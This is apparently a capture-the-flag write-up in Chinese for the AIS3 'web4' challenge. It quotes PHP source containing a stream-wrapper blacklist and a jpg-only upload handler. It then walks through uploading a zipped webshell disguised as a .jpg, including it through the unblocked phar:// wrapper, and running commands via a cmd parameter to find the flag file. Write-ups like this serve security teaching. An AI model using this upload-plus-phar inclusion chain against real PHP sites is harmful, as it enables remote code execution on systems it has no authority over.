## web4
### sol
從第三題的index的source code中可以看到以下幾個部分
```php
$blacklist = ["http", "ftp", "data", "zip"];
foreach ($blacklist as &$s)
    stream_wrapper_unregister($s);
...
$pages = array(
    // disabled
    // "uploaddddddd" => "Uploads",
    "about" => "About"
);
...

<?php
include "header.php";
include $p . ".php";
?>
```
可以發現 https://quiz.ais3.org:23545/?p=uploaddddddd ，先猜要上傳webshell，而再用filter看此頁的source code

```php
function RandomString()
{
    $characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $randstring = "";
    for ($i = 0; $i < 9; $i++) {
        $randstring .= $characters[rand(0, strlen($characters)-1)];
    }
    return $randstring;
}

...
if(isset($_FILES["fileToUpload"]))
{
    $filename = basename($_FILES['fileToUpload']['name']);
    $imageFileType = pathinfo($filename, PATHINFO_EXTENSION);
    if($imageFileType == "jpg")
    {
        $uploadOk = 1;
    }
    ...
if($uploadOk)
{
    $ip = $_SERVER["REMOTE_ADDR"];

    $dir = "$target_dir/$ip";
    if(!is_dir($dir))
        mkdir($dir);

    $newid = RandomString();
    $newpath = "$dir/$newid.jpg";
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $newpath))
    {
        header("Location: $newpath");
        exit();
    }
    ...
}
?>
```
上傳是用whitelist檢查，extension必須為jpg，而且上傳後會重新命名為`[0-9a-zA-Z]{9}.jpg`，因此在local端取什麼filename都不影響，而試過基本的jpg沒辦法直接執行，因此要透過`index.php`的`include`將webshell include進去。

由於會強制補上`.php`，且php版本較新，舊有的NULL byte injection試過也行不通，最後試了幾種stream wrapper，發現blacklist獨漏了[phar](http://php.net/manual/en/phar.using.stream.php)，將shell.php(include最後會補上.php，因此副檔名要是php)壓縮為zip之後上傳，請求
```
https://quiz.ais3.org:23545/?p=phar://[your_ip]/[random].jpg/shell
```
可以發現成功include了shell，接著加上要執行的指令參數
```
https://quiz.ais3.org:23545/?cmd=ls&p=phar://[your_ip]/[random].jpg/shell
```
就可以看到flag的檔案了
```
about.php
css
header.php
home.php
images
img
index.php
js
the_flag2_which_the_filename_you_can_not_guess_without_getting_the_shellllllll1l
uploaddddddd.php
```
最後直接從browser開啟 https://quiz.ais3.org:23545/the_flag2_which_the_filename_you_can_not_guess_without_getting_the_shellllllll1l 就能看到flag了
